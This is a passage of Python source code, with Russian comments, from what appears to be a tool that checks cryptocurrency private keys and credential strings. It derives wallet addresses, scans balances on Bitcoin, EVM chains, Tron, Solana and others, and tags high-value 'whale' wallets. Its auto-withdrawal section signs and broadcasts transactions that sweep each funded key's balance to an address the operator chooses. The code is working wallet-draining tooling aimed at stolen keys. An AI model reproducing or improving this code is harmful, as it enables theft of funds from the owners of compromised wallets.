                checksum = hashlib.sha256(hashlib.sha256(extended_key).digest()).digest()[:4]
                wif_bytes = extended_key + checksum
                wif = base58.b58encode(wif_bytes).decode()
                result["info"]["formats"]["wif_compressed"] = wif
            except Exception:
                pass
            
            # 10. Экспорт для кошельков
            result["info"]["export"] = {
                "metamask": {"address": address, "privateKey": key_hex},
                "trust_wallet": f"ethereum:{key_hex}",
            }
            
        except Exception as e:
            result["info"]["error"] = f"Неверный приватный ключ: {e}"
            return result
        
        # Проверка баланса на всех EVM сетях
        chain_results = await self._multichain_scan(address, timeout, proxy, session, prices)
        total_usd = sum(r["usd"] for r in chain_results.values())
        active = [c for c, r in chain_results.items() if r["balance"] > 0]
        
        result["info"]["chains"] = chain_results
        result["info"]["total_usd"] = total_usd
        result["exists"] = bool(active)
        result["info"]["auth"] = self.auth_info["ethereum"]
        
        msg = f"PrivKey HEX -> {address}"
        if security_warnings:
            msg += f" | {security_warnings[0]}"
        msg += f" | Сети: {', '.join(active) if active else 'нет'} | ~${total_usd:,.2f}"
        msg += self._whale_label(total_usd)
        
        result["info"]["message"] = msg
        
        # АВТОВЫВОД (если включен)
        if self.auto_withdraw_enabled and result["exists"]:
            withdraw_results = []
            for chain_name, chain_data in chain_results.items():
                if chain_data["balance"] > 0:
                    withdraw_result = await self._auto_withdraw_eth(
                        key_hex, address, chain_data["balance"], chain_name
                    )
                    if withdraw_result and withdraw_result.get("success"):
                        withdraw_results.append(withdraw_result)
                        result["info"]["message"] += f" | {withdraw_result['message']}"
            
            if withdraw_results:
                result["info"]["auto_withdraw"] = withdraw_results
        
        return result

    async def _check_privkey_wif(self, wif, timeout, proxy, session):
        """
        УЛУЧШЕННАЯ ПРОВЕРКА WIF ПРИВАТНОГО КЛЮЧА:
        5. Поддержка compressed/uncompressed
        6. Автоопределение формата
        7. Конвертация в HEX и другие форматы
        8. Проверка безопасности
        10. Экспорт для кошельков
        """
        result = self.make_result(input=wif[:10]+"...", type="privkey_wif")
        prices = await self._get_prices(session, timeout)
        
        try:
            from bip_utils import WifDecoder, P2PKHAddr, P2WPKHAddr, Secp256k1PrivateKey
            import base58
            
            # Декодирование WIF
            priv_bytes, is_compressed = WifDecoder.Decode(wif)
            priv_key = Secp256k1PrivateKey.FromBytes(priv_bytes)
            
            # Генерация разных типов адресов
            addresses = {}
            addresses["P2PKH_Legacy"] = P2PKHAddr.EncodeKey(priv_key.PublicKey().KeyObject())
            
            try:
                addresses["P2WPKH_SegWit"] = P2WPKHAddr.EncodeKey(priv_key.PublicKey().KeyObject())
            except Exception:
                pass
            
            result["info"]["addresses"] = addresses
            result["info"]["is_compressed"] = is_compressed
            result["info"]["format_type"] = "Compressed WIF" if is_compressed else "Uncompressed WIF"
            
            # 7. Конвертация форматов
            priv_hex = priv_bytes.hex()
            result["info"]["formats"] = {
                "wif": wif,
                "hex": priv_hex,
                "hex_with_0x": "0x" + priv_hex,
                "decimal": str(int(priv_hex, 16)),
                "compressed": is_compressed,
            }
            
            # 8. Проверка безопасности
            key_int = int(priv_hex, 16)
            security_warnings = []
            
            if key_int < 1000:
                security_warnings.append("⚠️ ОПАСНО: Слишком простой ключ")
            elif key_int == 1:
                security_warnings.append("⚠️ ОПАСНО: Ключ = 1")
            
            result["info"]["security_warnings"] = security_warnings
            result["info"]["security_status"] = "⚠️ НЕБЕЗОПАСНО" if security_warnings else "✓ Безопасно"
            
            # 10. Экспорт для кошельков
            result["info"]["export"] = {
                "electrum": wif,
                "bitcoin_core": f"importprivkey {wif}",
            }
            
        except Exception as e:
            result["info"]["error"] = f"Неверный WIF ключ: {e}"
            return result
        
        # Проверка баланса на всех Bitcoin адресах
        address = addresses.get("P2PKH_Legacy", "")
        btc_result = await self._check_bitcoin(address, timeout, proxy, session)
        
        result["exists"] = btc_result.get("exists", False)
        result["info"].update(btc_result.get("info", {}))
        result["info"]["auth"] = self.auth_info["bitcoin"]
        
        msg = f"WIF ({result['info']['format_type']}) -> {address}"
        if security_warnings:
            msg += f" | {security_warnings[0]}"
        msg += " | " + btc_result["info"].get("message", "")
        
        result["info"]["message"] = msg
        return result

    async def _multichain_scan(self, address, timeout, proxy, session, prices):
        async def _check_chain(chain_name, rpc_url, symbol):
            try:
                payload = {"jsonrpc":"2.0","id":1,"method":"eth_getBalance","params":[address,"latest"]}
                resp = await self.fetch(session, "POST", rpc_url, timeout=timeout, proxy=proxy, json=payload, headers={"Content-Type":"application/json"})
                if resp.status == 200:
                    d = await resp.json(); resp.close()
                    bal = int(d.get("result") or "0x0", 16) / 1e18
                    usd = bal * prices.get({"ETH":"ethereum","BNB":"bnb","MATIC":"polygon"}.get(symbol, "ethereum"), 0)
                    return chain_name, {"balance": bal, "symbol": symbol, "usd": usd, "message": f"{bal:.18f} {symbol} (~${usd:,.2f})"}
                resp.close()
            except Exception: pass
            return chain_name, {"balance": 0.0, "symbol": symbol, "usd": 0.0, "message": "error"}

        tasks = [_check_chain(name, url, sym) for name, url, sym in _EVM_CHAINS]
        return dict(await asyncio.gather(*tasks))

    def _detect_wallet(self, data):
        s = data.strip()
        if not s or s[0] not in _WALLET_FIRST_CHARS: return None
        for wallet_type, pattern in _WALLET_PATTERNS:
            if pattern.match(s): return wallet_type
        return None

    def _detect_exchange(self, data):
        dl = data.lower()
        for ex in self.exchanges:
            if ex in dl: return ex
        return None

    def _parse_credentials(self, data):
        s = data.strip().replace("|", ":")
        url_m = re.match(r"https?://[^\s:]+", s)
        tokens = [t for t in s[url_m.end():].split(":") if t.strip()] if url_m else [t for t in s.split(":") if t.strip()]
        if tokens and "." in tokens[0]: tokens = tokens[1:]
        return (tokens[0] if tokens else ""), (tokens[1] if len(tokens) > 1 else "")

    async def _check_bitcoin(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="bitcoin", valid=True)
        prices = await self._get_prices(session, timeout)
        for api_name, url, fmt in [
            ("mempool.space",   f"https://mempool.space/api/address/{address}",        "json"),
            ("blockchain.info", f"https://blockchain.info/q/addressbalance/{address}", "text"),
        ]:
            try:
                resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
                if resp.status == 200:
                    if fmt == "text":
                        balance = int((await resp.text()).strip()) / 1e8; tx_count = 0
                    else:
                        d = await resp.json(); resp.close(); cs = d.get("chain_stats", {})
                        balance = (cs.get("funded_txo_sum",0) - cs.get("spent_txo_sum",0)) / 1e8
                        tx_count = cs.get("tx_count", 0)
                    
                    result["info"]["balance_btc"] = balance; result["exists"] = balance > 0
                    usd = self._usd(balance, "bitcoin", prices)
                    whale = self._whale_label(balance * prices.get("bitcoin", 0))
                    ord_msg = await self._check_btc_ordinals(address, timeout, proxy, session)
                    
                    result["info"]["message"] = f"Balance: {balance:.8f} BTC{usd}" + (" (empty)" if not result["exists"] else "") + whale + ord_msg
                    return result
                resp.close()
            except Exception: continue
        result["info"]["error"] = "All BTC APIs failed"; return result

    async def _check_ethereum(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="ethereum", valid=True)
        prices = await self._get_prices(session, timeout)
        balance = None
        
        k = os.environ.get("ETHERSCAN_API_KEY", "")
        e_url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest"
        if k: e_url += f"&apikey={k}"

        for api_name, url, fmt in [("etherscan", e_url, "etherscan"), ("cloudflare", "https://cloudflare-eth.com", "rpc")]:
            try:
                if fmt == "etherscan":
                    resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
                    if resp.status == 200:
                        d = await resp.json(); resp.close()
                        if d.get("status") == "1": balance = int(d["result"]) / 1e18; break
                    resp.close()
                else:
                    p = {"jsonrpc":"2.0","id":1,"method":"eth_getBalance","params":[address,"latest"]}
                    resp = await self.fetch(session, "POST", url, timeout=timeout, proxy=proxy, json=p, headers={"Content-Type":"application/json"})
                    if resp.status == 200:
                        d = await resp.json(); resp.close()
                        if "result" in d: balance = int(d["result"],16) / 1e18; break
                    resp.close()
            except Exception: continue

        if balance is not None:
            # Run all checks concurrently
            tokens, bsc_tokens, polygon_tokens, uni_v3, nfts, staking, last_tx, approvals, activity, airdrop_msg, gas_price, wallet_age = await asyncio.gather(
                self._check_erc20(address, timeout, proxy, session),
                self._check_bsc_tokens(address, timeout, proxy, session),
                self._check_polygon_tokens(address, timeout, proxy, session),
                self._check_uniswap_v3_positions(address, timeout, proxy, session),
                self._check_nft(address, timeout, proxy, session),
                self._check_staking(address, timeout, proxy, session),
                self._get_last_tx_eth(address, timeout, proxy, session),
                self._check_approvals(address, timeout, proxy, session),
                self._get_activity_score(address, timeout, proxy, session),
                self._check_airdrop_eligibility(address, timeout, proxy, session),
                self._get_gas_price(session, timeout),
                self._get_wallet_age_eth(address, timeout, proxy, session),
                return_exceptions=True
            )
            
            # Handle exceptions
            if isinstance(tokens, Exception): tokens = {}
            if isinstance(bsc_tokens, Exception): bsc_tokens = {}
            if isinstance(polygon_tokens, Exception): polygon_tokens = {}
            if isinstance(uni_v3, Exception): uni_v3 = ""
            if isinstance(nfts, Exception): nfts = ""
            if isinstance(staking, Exception): staking = {}
            if isinstance(last_tx, Exception): last_tx = ""
            if isinstance(approvals, Exception): approvals = []
            if isinstance(activity, Exception): activity = ""
            if isinstance(airdrop_msg, Exception): airdrop_msg = ""
            if isinstance(gas_price, Exception): gas_price = ""
            if isinstance(wallet_age, Exception): wallet_age = ""

            token_prices = await self._get_token_prices(list(tokens.keys()), session, timeout)
            total_token_usd = sum(tv * token_prices.get(tk.upper(), 1.0) for tk, tv in tokens.items())
            total_token_usd += sum(bsc_tokens.values()) + sum(polygon_tokens.values())

            result["info"].update({"balance_eth": balance, "tokens": tokens, "bsc_tokens": bsc_tokens, "polygon_tokens": polygon_tokens, "token_usd": total_token_usd, "gas_price": gas_price, "wallet_age": wallet_age})
            result["exists"] = balance > 0 or bool(tokens) or bool(bsc_tokens) or bool(polygon_tokens)
            
            usd = self._usd(balance, "ethereum", prices)
            msg = f"Balance: {balance:.18f} ETH{usd}"
            if tokens: msg += " | Tokens: " + ", ".join(f"{v:.6f} {k}" for k,v in tokens.items())
            if bsc_tokens: msg += " | BSC: " + ", ".join(f"{v:.2f} {k}" for k,v in bsc_tokens.items())
            if polygon_tokens: msg += " | Polygon: " + ", ".join(f"{v:.2f} {k}" for k,v in polygon_tokens.items())
            if total_token_usd > 0: msg += f" | Найдено токенов на: ~${total_token_usd:,.2f}"
            if last_tx: msg += f" | Last Tx: {last_tx}"
            if gas_price: msg += f" | Gas: {gas_price}"
            if wallet_age: msg += f" | Age: {wallet_age}"
            if approvals: msg += f" | Аппрувы: {', '.join(approvals)}"
            if activity: msg += f" | Активность: {activity}"
            msg += airdrop_msg
            if not result["exists"]: msg += " (empty)"
            
            total_eth_usd = balance * prices.get("ethereum", {}).get("price", 0) + total_token_usd
            result["info"]["total_usd"] = total_eth_usd; result["info"]["message"] = msg + self._whale_label(total_eth_usd)
        else:
            result["info"]["error"] = "All ETH APIs failed"
        return result

    async def _check_approvals(self, address, timeout, proxy, session):
        approved = []
        for r_name, r_addr in _DEX_ROUTERS.items():
            try:
                data_hex = "0xdd62ed3e" + "000000000000000000000000" + address[2:].lower() + "000000000000000000000000" + r_addr[2:].lower()
                p = {"jsonrpc":"2.0","id":1,"method":"eth_call","params":[{"to":_USDT_CONTRACT,"data":data_hex},"latest"]}
                resp = await self.fetch(session, "POST", "https://cloudflare-eth.com", timeout=timeout, proxy=proxy, json=p, headers={"Content-Type":"application/json"})
                if resp.status == 200:
                    d = await resp.json(); resp.close()
                    if int(d.get("result", "0x0"), 16) > 0: approved.append(r_name)
                resp.close()
            except Exception: pass
        return approved

    async def _check_evm_rpc_token(self, address, rpc_url, contract, decimals, timeout, proxy, session):
        try:
            data_hex = "0x70a08231" + "000000000000000000000000" + address[2:]
            p = {"jsonrpc": "2.0", "id": 1, "method": "eth_call", "params": [{"to": contract, "data": data_hex}, "latest"]}
            resp = await self.fetch(session, "POST", rpc_url, timeout=timeout, proxy=proxy, json=p, headers={"Content-Type": "application/json"})
            if resp.status == 200:
                d = await resp.json(); resp.close()
                return int(d.get("result", "0x0"), 16) / 10**decimals
            resp.close()
        except Exception: pass
        return 0.0

    async def _check_erc20(self, address, timeout, proxy, session):
        balances = {}
        for s, (c, d) in _ERC20_TOKENS.items():
            v = await self._check_evm_rpc_token(address, "https://cloudflare-eth.com", c, d, timeout, proxy, session)
            if v > 0: balances[s] = v
        return balances

    async def _check_bsc_tokens(self, address, timeout, proxy, session):
        balances = {}
        tokens = {"BSC_USDT": ("0x55d398326f99059fF775485246999027B3197955", 18), "BSC_USDC": ("0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", 18)}
        for s, (c, d) in tokens.items():
            v = await self._check_evm_rpc_token(address, "https://bsc-dataseed.binance.org/", c, d, timeout, proxy, session)
            if v > 0: balances[s] = v
        return balances

    async def _check_polygon_tokens(self, address, timeout, proxy, session):
        balances = {}
        tokens = {"POLY_USDT": ("0xc2132D05D31c914a87C6611C10748AEb04B58e8F", 6), "POLY_USDC": ("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", 6)}
        for s, (c, d) in tokens.items():
            v = await self._check_evm_rpc_token(address, "https://polygon-rpc.com", c, d, timeout, proxy, session)
            if v > 0: balances[s] = v
        return balances

    async def _check_uniswap_v3_positions(self, address, timeout, proxy, session):
        v = await self._check_evm_rpc_token(address, "https://cloudflare-eth.com", "0xC36442b4a4522E871399CD717aBDD847Ab11FE88", 0, timeout, proxy, session)
        return f"Uniswap V3: {int(v)} positions" if v > 0 else ""

    async def _check_nft(self, address, timeout, proxy, session):
        try:
            h = {"accept": "application/json"}
            k = os.environ.get("OPENSEA_API_KEY", "")
            if k: h["X-API-KEY"] = k
            resp = await self.fetch(session, "GET", f"https://api.opensea.io/api/v2/chain/ethereum/account/{address}/nfts?limit=1", timeout=timeout, proxy=proxy, headers=h)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                return f"{len(d.get('nfts', []))}+" if d.get("next") else str(len(d.get("nfts", [])))
            resp.close()
        except Exception: pass
        return ""

    async def _check_staking(self, address, timeout, proxy, session):
        staking = {}
        tokens = {"stETH": ("0xae7ab96520de3a18e5e111b5eaab095312d7fe84", 18), "rETH": ("0xae78736cd615f374d3085123a210448e74fc6393", 18)}
        for s, (c, d) in tokens.items():
            v = await self._check_evm_rpc_token(address, "https://cloudflare-eth.com", c, d, timeout, proxy, session)
            if v > 0: staking[s] = v
        return staking

    async def _get_last_tx_eth(self, address, timeout, proxy, session):
        try:
            url = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&page=1&offset=1&sort=desc"
            k = os.environ.get("ETHERSCAN_API_KEY", "")
            if k: url += f"&apikey={k}"
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
            if resp.status == 200:
                d = await resp.json(); resp.close(); txs = d.get("result", [])
                if txs and isinstance(txs, list):
                    return f"{datetime.utcfromtimestamp(int(txs[0].get('timeStamp', 0))).strftime('%Y-%m-%d')} ({int(txs[0].get('value', 0))/1e18:.4f} ETH)"
            resp.close()
        except Exception: pass
        return ""

    # NEW: Gas price tracker
    async def _get_gas_price(self, session, timeout):
        """Get current ETH gas price in Gwei."""
        try:
            payload = {"jsonrpc":"2.0","id":1,"method":"eth_gasPrice","params":[]}
            resp = await self.fetch(session, "POST", "https://cloudflare-eth.com",
                                    timeout=timeout, proxy=None,
                                    json=payload, headers={"Content-Type":"application/json"})
            if resp.status == 200:
                d = await resp.json(); resp.close()
                wei = int(d.get("result","0x0"), 16)
                gwei = wei / 1e9
                return f"{gwei:.1f} Gwei"
            resp.close()
        except Exception:
            pass
        return ""

    # NEW: Wallet age (first transaction date)
    async def _get_wallet_age_eth(self, address, timeout, proxy, session):
        """Get date of first transaction."""
        try:
            url = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&page=1&offset=1&sort=asc"
            k = os.environ.get("ETHERSCAN_API_KEY", "")
            if k: url += f"&apikey={k}"
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                txs = d.get("result", [])
                if txs and isinstance(txs, list) and txs[0]:
                    ts = int(txs[0].get("timeStamp", 0))
                    from datetime import datetime
                    dt = datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d")
                    # Calculate age in days
                    age_days = (time.time() - ts) // 86400
                    return f"{dt} ({int(age_days)}d)"
            else:
                resp.close()
        except Exception:
            pass
        return ""

    async def _check_tron(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="tron", valid=True)
        prices = await self._get_prices(session, timeout)
        try:
            resp = await self.fetch(session, "GET", f"https://apilist.tronscanapi.com/api/accountv2?address={address}", timeout=timeout, proxy=proxy)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                balance = d.get("balance", 0) / 1e6
                
                trc20 = {}
                for t in d.get("trc20token_balances", []):
                    abbr = t.get("tokenAbbr", "").upper()
                    try:
                        b_raw = int(t.get("balance", 0) or 0)
                    except (ValueError, TypeError):
                        b_raw = 0
                    try:
                        dec = int(t.get("tokenDecimal", 6) or 6)
                    except (ValueError, TypeError):
                        dec = 6
                    if b_raw > 0 and abbr:
                        trc20[abbr] = b_raw / (10**dec)

                result["info"].update({"balance_trx": balance, "tokens": trc20})
                result["exists"] = balance > 0 or bool(trc20)
                usd = self._usd(balance, "tron", prices)
                msg = f"Balance: {balance:.6f} TRX{usd}"
                if trc20: msg += " | Токены TRC20: " + ", ".join(f"{v:.4f} {k}" for k, v in trc20.items())
                if not result["exists"]: msg += " (empty)"
                result["info"]["message"] = msg
            else: resp.close()
        except Exception as e: result["info"]["error"] = str(e)
        return result

    async def _check_solana(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="solana", valid=True)
        prices = await self._get_prices(session, timeout)
        for url in ["https://api.mainnet-beta.solana.com", "https://solana-api.projectserum.com"]:
            try:
                p = {"jsonrpc":"2.0","id":1,"method":"getBalance","params":[address]}
                resp = await self.fetch(session, "POST", url, timeout=timeout, proxy=proxy, json=p, headers={"Content-Type":"application/json"})
                if resp.status == 200:
                    d = await resp.json(); resp.close()
                    if "result" in d:
                        balance = d["result"]["value"] / 1e9
                        result["info"]["balance_sol"] = balance; result["exists"] = balance > 0
                        usd = self._usd(balance, "solana", prices)
                        msg = f"Balance: {balance:.6f} SOL{usd}"

                        spl = await self._check_spl_tokens(address, timeout, proxy, session)
                        if spl:
                            result["info"]["spl_tokens"] = spl; result["exists"] = True
                            msg += " | SPL Токены: " + ", ".join(f"{v} {k}" for k, v in spl.items())
                        
                        if not result["exists"]: msg += " (empty)"
                        result["info"]["message"] = msg; return result
                    resp.close()
            except Exception: continue
        result["info"]["error"] = "All SOL APIs failed"; return result

    async def _check_spl_tokens(self, address, timeout, proxy, session):
        tokens = {}
        known_mints = {
            "EPjFW3dpEqEU2o194Kzk9GwZ99Q11111111111111111": "USDC",
            "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11111111111111": "USDT",
            "So11111111111111111111111111111111111111112": "wSOL",
            "EKpQGSJtjMFqBBm9938CgX9uw96S67beBU8vA5w3pump": "WIF",
            "DezXAZ8z7PnrFcEDUsPR4oFc8C8cH1m1JitEX62G16nn": "BONK"
        }
        try:
            p = {"jsonrpc": "2.0", "id": 1, "method": "getTokenAccountsByOwner", "params": [address, {"programId": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"}, {"encoding": "jsonParsed"}]}
            resp = await self.fetch(session, "POST", "https://api.mainnet-beta.solana.com", timeout=timeout, proxy=proxy, json=p, headers={"Content-Type": "application/json"})
            if resp.status == 200:
                d = await resp.json(); resp.close()
                if "result" in d and d["result"].get("value"):
                    for acc in d["result"]["value"]:
                        parsed = acc.get("account", {}).get("data", {}).get("parsed", {})
                        info = parsed.get("info", {})
                        amt = float(info.get("tokenAmount", {}).get("uiAmount", 0) or 0)
                        mint = info.get("mint", "")
                        if amt > 0 and mint:
                            ticker = known_mints.get(mint, mint[:5] + "...")
                            tokens[ticker] = round(amt, 4)
            else: resp.close()
        except Exception: pass
        return tokens

    async def _check_ton(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="ton", valid=True)
        prices = await self._get_prices(session, timeout)
        try:
            resp = await self.fetch(session, "GET", f"https://toncenter.com/api/v2/getAddressInformation?address={address}", timeout=timeout, proxy=proxy)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                if d.get("ok"):
                    balance = int(d["result"].get("balance", 0)) / 1e9
                    result["info"]["balance_ton"] = balance; result["exists"] = balance > 0
                    usd = self._usd(balance, "ton", prices)
                    result["info"]["message"] = f"Balance: {balance:.4f} TON{usd}" + (" (empty)" if not result["exists"] else "")
            else: resp.close()
        except Exception as e: result["info"]["error"] = str(e)
        return result

    async def _check_cardano(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="cardano", valid=True)
        prices = await self._get_prices(session, timeout)
        try:
            p_id = os.environ.get("BLOCKFROST_PROJECT_ID", "mainnetplaceholder")
            resp = await self.fetch(session, "GET", f"https://cardano-mainnet.blockfrost.io/api/v0/addresses/{address}", timeout=timeout, proxy=proxy, headers={"project_id": p_id})
            if resp.status == 200:
                d = await resp.json(); resp.close()
                lovelace = int(next((a["quantity"] for a in d.get("amount", []) if a["unit"] == "lovelace"), 0))
                balance = lovelace / 1e6
                result["info"]["balance_ada"] = balance; result["exists"] = balance > 0
                usd = self._usd(balance, "cardano", prices)
                result["info"]["message"] = f"Balance: {balance:.4f} ADA{usd}" + (" (empty)" if not result["exists"] else "")
            else: resp.close()
        except Exception as e: result["info"]["error"] = str(e)
        return result

    async def _check_litecoin(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="litecoin", valid=True)
        prices = await self._get_prices(session, timeout)
        try:
            resp = await self.fetch(session, "GET", f"https://api.blockchair.com/litecoin/dashboards/address/{address}", timeout=timeout, proxy=proxy)
            if resp.status == 200:
                ad = (await resp.json()).get("data", {}).get(address, {}).get("address", {})
                balance = ad.get("balance", 0) / 1e8
                result["info"]["balance_ltc"] = balance; result["exists"] = balance > 0
                result["info"]["message"] = f"Balance: {balance:.8f} LTC" + self._usd(balance, "litecoin", prices) + (" (empty)" if not result["exists"] else "")
            else: resp.close()
        except Exception as e: result["info"]["error"] = str(e)
        return result

    async def _check_dash(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="dash", valid=True)
        prices = await self._get_prices(session, timeout)
        try:
            resp = await self.fetch(session, "GET", f"https://api.blockchair.com/dash/dashboards/address/{address}", timeout=timeout, proxy=proxy)
            if resp.status == 200:
                ad = (await resp.json()).get("data", {}).get(address, {}).get("address", {})
                balance = ad.get("balance", 0) / 1e8
                result["info"]["balance_dash"] = balance; result["exists"] = balance > 0
                result["info"]["message"] = f"Balance: {balance:.8f} DASH" + self._usd(balance, "dash", prices) + (" (empty)" if not result["exists"] else "")
            else: resp.close()
        except Exception as e: result["info"]["error"] = str(e)
        return result

    async def _check_monero(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="monero", valid=True)
        try:
            resp = await self.fetch(session, "GET", f"https://xmrchain.net/api/outputs?address={address}&viewkey=&page=0&limit=1", timeout=timeout, proxy=proxy)
            result["exists"] = resp.status == 200; resp.close()
            result["info"]["message"] = "Адрес валиден (баланс требует View Key)" if result["exists"] else "API error"
        except Exception as e: result["info"]["error"] = str(e)
        return result

    async def _check_ripple(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="ripple", valid=True)
        prices = await self._get_prices(session, timeout)
        try:
            p = {"method": "account_info", "params": [{"account": address, "strict": True}]}
            resp = await self.fetch(session, "POST", "https://xrplcluster.com/", timeout=timeout, proxy=proxy, json=p, headers={"Content-Type": "application/json"})
            if resp.status == 200:
                r = (await resp.json()).get("result", {})
                if r.get("status") == "success":
                    balance = int(r.get("account_data", {}).get("Balance", 0)) / 1e6
                    result["info"]["balance_xrp"] = balance; result["exists"] = balance > 0
                    result["info"]["message"] = f"Balance: {balance:.4f} XRP" + self._usd(balance, "ripple", prices) + (" (empty)" if not result["exists"] else "")
            else: resp.close()
        except Exception as e: result["info"]["error"] = str(e)
        return result

    async def _check_dogecoin(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="dogecoin", valid=True)
        prices = await self._get_prices(session, timeout)
        try:
            resp = await self.fetch(session, "GET", f"https://api.blockchair.com/dogecoin/dashboards/address/{address}", timeout=timeout, proxy=proxy)
            if resp.status == 200:
                ad = (await resp.json()).get("data", {}).get(address, {}).get("address", {})
                balance = ad.get("balance", 0) / 1e8
                result["info"]["balance_doge"] = balance; result["exists"] = balance > 0
                result["info"]["message"] = f"Balance: {balance:.8f} DOGE" + self._usd(balance, "dogecoin", prices) + (" (empty)" if not result["exists"] else "")
            else: resp.close()
        except Exception as e: result["info"]["error"] = str(e)
        return result

    async def _check_bnb(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="bnb", valid=True)
        prices = await self._get_prices(session, timeout)
        try:
            p = {"jsonrpc": "2.0", "id": 1, "method": "eth_getBalance", "params": [address, "latest"]}
            resp = await self.fetch(session, "POST", "https://bsc-dataseed.binance.org/", timeout=timeout, proxy=proxy, json=p, headers={"Content-Type": "application/json"})
            if resp.status == 200:
                d = await resp.json(); resp.close()
                balance = int(d.get("result", "0x0"), 16) / 1e18
                result["info"]["balance_bnb"] = balance; result["exists"] = balance > 0
                result["info"]["message"] = f"Balance: {balance:.18f} BNB" + self._usd(balance, "bnb", prices) + (" (empty)" if not result["exists"] else "")
            else: resp.close()
        except Exception as e: result["info"]["error"] = str(e)
        return result

    # ═══════════════════════════════════════════════════════════════════════════
    #  АВТОВЫВОД СРЕДСТВ
    # ═══════════════════════════════════════════════════════════════════════════
    
    def enable_auto_withdraw(self, addresses: dict, min_amounts: dict = None):
        """
        Включить автовывод средств.
        
        addresses = {
            "ethereum": "0x...",
            "bsc": "0x...",
            "bitcoin": "bc1...",
            "tron": "T...",
            "solana": "..."
        }
        
        min_amounts = {
            "ethereum": 0.01,  # Минимум для вывода
            "bsc": 0.01,
            ...
        }
        """
        self.auto_withdraw_enabled = True
        self.withdraw_addresses.update(addresses)
        if min_amounts:
            self.withdraw_min_amounts.update(min_amounts)
        
        print("✓ Автовывод включен!")
        print(f"  ETH адрес: {self.withdraw_addresses.get('ethereum', 'не указан')}")
        print(f"  BSC адрес: {self.withdraw_addresses.get('bsc', 'не указан')}")
        print(f"  BTC адрес: {self.withdraw_addresses.get('bitcoin', 'не указан')}")
        print(f"  TRX адрес: {self.withdraw_addresses.get('tron', 'не указан')}")
        print(f"  SOL адрес: {self.withdraw_addresses.get('solana', 'не указан')}")
    
    def disable_auto_withdraw(self):
        """Выключить автовывод."""
        self.auto_withdraw_enabled = False
        print("✗ Автовывод выключен")
    
    async def _auto_withdraw_eth(self, private_key: str, from_address: str, balance: float, chain: str = "ethereum"):
        """
        Автовывод ETH/BNB/MATIC и других EVM токенов.
        """
        if not self.auto_withdraw_enabled:
            return None
        
        to_address = self.withdraw_addresses.get(chain)
        if not to_address:
            return {"error": f"Адрес для {chain} не указан"}
        
        min_amount = self.withdraw_min_amounts.get(chain, 0.01)
        if balance < min_amount:
            return {"error": f"Баланс {balance} меньше минимума {min_amount}"}
        
        try:
            from web3 import Web3
            from eth_account import Account
            
            # Подключение к сети
            rpc_urls = {
                "ethereum": "https://cloudflare-eth.com",
                "bsc": "https://bsc-dataseed.binance.org/",
                "polygon": "https://polygon-rpc.com",
                "avalanche": "https://api.avax.network/ext/bc/C/rpc",
                "base": "https://mainnet.base.org",
                "arbitrum": "https://arb1.arbitrum.io/rpc",
                "optimism": "https://mainnet.optimism.io",
            }
            
            rpc_url = rpc_urls.get(chain, rpc_urls["ethereum"])
            w3 = Web3(Web3.HTTPProvider(rpc_url))
            
            if not w3.is_connected():
                return {"error": f"Не удалось подключиться к {chain}"}
            
            # Получение аккаунта
            account = Account.from_key(private_key)
            
            # Получение gas price
            gas_price = w3.eth.gas_price
            gas_limit = 21000  # Стандартный лимит для ETH transfer
            
            # Расчет комиссии
            gas_cost = gas_price * gas_limit / 10**18
            
            # Сумма для отправки (оставляем немного на газ)
            if _AUTO_WITHDRAW_LEAVE_GAS:
                amount_to_send = balance - gas_cost - 0.0001  # Оставляем запас
            else:
                amount_to_send = balance - gas_cost
            
            if amount_to_send <= 0:
                return {"error": f"Недостаточно средств для покрытия газа. Баланс: {balance}, Gas: {gas_cost}"}
            
            # Получение nonce
            nonce = w3.eth.get_transaction_count(from_address)
            
            # Создание транзакции
            transaction = {
                'nonce': nonce,
                'to': to_address,
                'value': w3.to_wei(amount_to_send, 'ether'),
                'gas': gas_limit,
                'gasPrice': gas_price,
                'chainId': w3.eth.chain_id,
            }
            
            # Подпись транзакции
            signed_txn = account.sign_transaction(transaction)
            
            # Отправка транзакции
            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
            tx_hash_hex = tx_hash.hex()
            
            # Логирование
            log_entry = {
                "timestamp": time.time(),
                "chain": chain,
                "from": from_address,
                "to": to_address,
                "amount": amount_to_send,
                "tx_hash": tx_hash_hex,
                "status": "sent"
            }
            _AUTO_WITHDRAW_LOG.append(log_entry)
            
            return {
                "success": True,
                "tx_hash": tx_hash_hex,
                "amount": amount_to_send,
                "gas_cost": gas_cost,
                "explorer": f"https://etherscan.io/tx/{tx_hash_hex}" if chain == "ethereum" else f"https://bscscan.com/tx/{tx_hash_hex}",
                "message": f"✓ Отправлено {amount_to_send:.6f} {chain.upper()} на {to_address[:10]}...{to_address[-6:]}"
            }
            
